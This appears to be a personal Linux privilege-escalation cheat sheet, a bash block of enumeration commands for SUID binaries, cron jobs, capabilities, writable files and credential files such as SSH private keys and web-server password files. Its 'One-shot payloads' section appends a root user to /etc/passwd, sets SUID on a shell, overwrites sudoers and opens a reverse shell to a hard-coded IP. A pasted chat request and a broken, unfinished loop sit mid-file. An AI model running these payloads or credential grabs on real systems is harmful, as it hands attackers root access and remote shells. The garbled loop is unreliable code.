### Linux Privilege Escalation (Condensed version of notes/linux_privesc.md)

```bash
# Proper shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp:/snap/bin
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
# Ctrl + Z (Background Process)
stty raw -echo ; fg ; reset
stty columns 200 rows 200

/dev/shm/shell80&
./pspy

# Basic
id ; env ; hostname ; /etc/issue ; /etc/os-release ; uname -a ;
systemctl show-environment # show system path

# Users
getent passwd | grep -v 'sshd' | grep 'sh\|:0:' --color
getent group

# Ports
( ip a || ifconfig )
( netstat -punta || ss -nltpu || netstat -anv ) | grep -i listen 2>/dev/null
netstat -punta | grep -E ':3389|:3350'
ps -fp $pid

# Pray
sudo -l

# SUIDs and GUIDs
ll $(find / -perm -u=s -type f 2>/dev/null ) && ll $(find / -perm -g=s -type f 2>/dev/null )

# Capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Crontabs
crontab -l
sudo crontab -l
crontab -l -u $user
ll -R /etc/cron* /var/spool/cron*
cat /etc/cron* /etc/cron*/* /var/spool/cron/* /var/spool/cron/*/*

roops=$(groups | tr ' ' '\n')
users=$(awk -F: '/sh$/{print $1}' /etc/passwd 2>/dev/null)
# Have files that show who uniquely owns what
# Delete duplicates
# Also do for username as the group
# Trim whitespace and stuff
# Remove lines containing .readable, .writable, .executable before diffing
# Recognize directories that you cannot read/write/execute, or just do the same thing to make it easy

# Thanks for help with the code. To give you more context, I'm trying to make something that will allow me to visualize what makes users unique within the scope of permissions on the file system by using 'diff' or something better to highlight abnormalities. One potential problem is that there are so many files, for instance, this is the updated output, `ll /dev/shm
total 20M
   0 drwxrwxrwt  2 root     root      260 Oct 17 12:19 .
4.5M -rw-rw-r--  1 kali     kali     4.5M Oct 17 12:19 kali.executable
4.2M -rw-rw-r--  1 kali     kali     4.2M Oct 17 12:19 kali.writable
4.5M -rw-rw-r--  1 kali     kali     4.5M Oct 17 12:19 kali.readable
4.0K -rw-rw-r--  1 kali     kali      164 Oct 17 12:19 postgres.executable
   0 -rw-rw-r--  1 kali     kali        0 Oct 17 12:18 postgres.writable
4.0K -rw-rw-r--  1 kali     kali      164 Oct 17 12:18 postgres.readable
2.9M -rw-rw-r--  1 kali     kali     2.9M Oct 17 12:18 root.executable
4.0K -rw-rw-r--  1 kali     kali     2.1K Oct 17 12:18 root.writable
2.9M -rw-rw-r--  1 kali     kali     2.9M Oct 17 12:18 root.readable`. This is overwhelming and would take a very long time to sort through, which is not the purpose of the code. One potential solution that I'm thinking about is, if there is a directory with more than x files, simply print the directory. The only thing wrong with this approach is that it can miss out on valuable stuff, but that's just my first impression. An idea that I like more is to recognize if a file belongs a user (or the users group - same as username) inside of a directory that is owned by somebody else. Help me think through what I can do that would best allow me to visualize what makes users unique within the scope of permissions on the file system.
# If there is a directory with more than x files, simply print the directory. The only thing wrong with this approach is that it can miss out on valuable stuff. In order to cut down

# Recognize if the user has ptype on a file inside a directory that is owned by somebody else. 

for f in $ (ls /dev/shm/); do awk 'NF{$1=$1};1' $f && sed -i "/readable\|writable\|executable/d" > ${f}.tmp && mv ${f}.tmp ${f}

for user in users; do
# Valuable insights come when you pivot users & differentiate
for ptype in $(echo "readable" "writable" "executable"); do find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -"${ptype}" 2>/dev/null > /dev/shm/$(whoami)."${ptype}" ; wait ; sort /dev/shm/$(whoami)."${ptype}" | awk 'NF{$1=$1};1' | sed -i "/readable\|writable\|executable/d" > /dev/shm/$(whoami)."${ptype}".tmp && mv /dev/shm/$(whoami)."${ptype}".tmp /dev/shm/$(whoami)."${ptype}" ; done

# Readable files and directories
ll -f $(find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -readable 2>/dev/null)
# or another interesting  user
for roop in $roops; do ll -f $(find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -readable -group $roop 2>/dev/null) ; wait ; done

# Writable files and directories
ll -f $(find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -writable 2>/dev/null)
for roop in $roops; do ll -f $(find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -writable -group $roop 2>/dev/null) ; wait ; done

# Executable files and directories
ll -d $(find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -executable 2>/dev/null)
for roop in $roops; do ll -d $(find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -executable -group $roop 2>/dev/null) ; wait ; done

# Interesting files, add other programs such as pl,go,..
ll -d $(find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -iregex '.*site-packages.*\|^.*/\.cargo.*\|.*stable-x86_64.*' -prune -o -iregex ".*\.kdbx\|.*\.ini\|.*\.conf\|.*\.cnf\|.*\.config.*\|.*\.db\|.*\.y*ml\|.*\.txt\|.*\.xml\|.*\.json\|.*\.dat\|.*\.secrets\|.*id_rsa\|.*id_dsa\|.*authorized_keys\|.*sites-available.*\|.*sites-enabled.*\|.*\..*rc\|.*\.env.*\|.*\.bak\|.*\.inf\|.*\.sql.*\|.*\.key\|.*\.sav\|.*\.log\|.*\.settings\|.*\.vcl\|.*conf.*\.php.*\|.*admin.*\.php\|database\.php\|db\.php\|storage\.php\|settings\.php\|installer\.php\|config\.inc\.php\|.*pass.*\.php\|.*\..*sh\|.*\.py\|^.*/\.[^/]*$" 2>/dev/null)

# Outdated software
apt list --upgradable
dpkg -l
lsmod
/sbin/modinfo libata

# File Enumeration
ll /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root

# MySQL,
mysql --version

# One-shot payloads injects
echo "hehe:$(openssl passwd LuLZ):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
chmod 4777 /bin/dash ; /bin/dash -p
echo “apache ALL=(root) NOPASSWD: ALL” > /etc/sudoers
bash -i >& /dev/tcp/192.168.45.178/80 0>&1
sed -i s/1001/0/g /etc/passwd

# File enumeration
grep "CRON" /var/log/syslog

# Apache
cat /var/log/apache/access.log /var/log/apache/error.log /var/log/apache2/access.log /var/log/apache2/error.log
/etc/apache2/.htpasswd /etc/apache2/ports.conf /etc/apache2/sites-enabled/domain.conf /etc/apache2/sites-available/domain.conf /etc/apache2/sites-available/000-default.conf /usr/local/apache2/conf/httpd.conf -al /usr/local/apache2/htdocs/

# Nginx
/usr/local

cat /var/log/nginx/access.log /var/log/nginx/error.log /etc/nginx/nginx.conf /etc/nginx/conf.d/.htpasswd /etc/nginx/sites-available/example.com.conf /etc/nginx/sites-enabled/example.com.conf /usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.conf

# PHP web conf
cat /etc/php/*\.*/apache2/php.ini /etc/php/*\.*/cli/php.ini /etc/php/*\.*/fpm/php.ini

# MySQL (MariaDB)
cat /etc/mysql/my.cnf /etc/mysql/debian.cnf /etc/mysql/mariadb.cnf /etc/mysql/conf.d/mysql.cnf /etc/mysql/

# SSH keys
ll /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa

# Modified in last 10 minutes
find / -type f -mmin -10 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -printf '%T+ %p\n' 2>/dev/null | head -100 | sort -r



# What's been modified after..
touch -t 202401031231.43 /tmp/wotsit
find / -newer /tmp/wotsit -print 2>/dev/null

```